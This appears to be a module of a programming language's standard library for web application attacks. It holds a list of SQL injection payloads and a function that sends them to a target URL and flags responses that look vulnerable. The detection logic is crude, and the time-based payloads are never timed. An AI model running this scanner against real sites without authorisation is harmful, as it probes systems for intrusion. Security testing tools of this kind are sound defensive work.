# Avelyn Standard Library: websec
# Web Application Attacks Module

import "http"
import "string"
import "crypto"
import "json"

# --- 0. Helpers ---

def websec_buildUrl(url, params) {
    var res = url
    var first = true
    if string["indexOf"](url, "?") >= 0 {
        first = false
    }
    let keys = mapKeys(params)
    for k in keys {
        if first {
            res = res + "?"
            first = false
        } else {
            res = res + "&"
        }
        res = res + k + "=" + http["urlEncode"](params[k])
    }
    return res
}

# --- 1. SQL Injection ---

let sqliPayloads = [
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1' OR '1'='1",
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--"
]

def websec_sqliTest(url, opts) {
    var param = opts["param"] ?? "id"
    var method = opts["method"] ?? "GET"
    
    var results = []
    
    # Baseline
    let baseResp = http["request"]({"method": method, "url": url})
    let baseStatus = baseResp["status"]
    let baseLen = string["len"](baseResp["body"])
    
    for payload in sqliPayloads {
        let testUrl = websec_buildUrl(url, {param: payload})
        let resp = http["request"]({"method": method, "url": testUrl})
        let status = resp["status"]
        let bodyLen = string["len"](resp["body"])
        
        var isVuln = false
        var reason = ""
        
        # Simple Error-Based / Boolean-based logic
        if status == 500 and baseStatus == 200 {
            isVuln = true
            reason = "Status code changed to 500"
        } else if bodyLen != baseLen {
            isVuln = true
            reason = "Response length differed (" + toString(baseLen) + " -> " + toString(bodyLen) + ")"
        }
        
        if isVuln {
            arrayPush(results, {"payload": payload, "reason": reason, "url": testUrl})
        }
    }
    return results
}

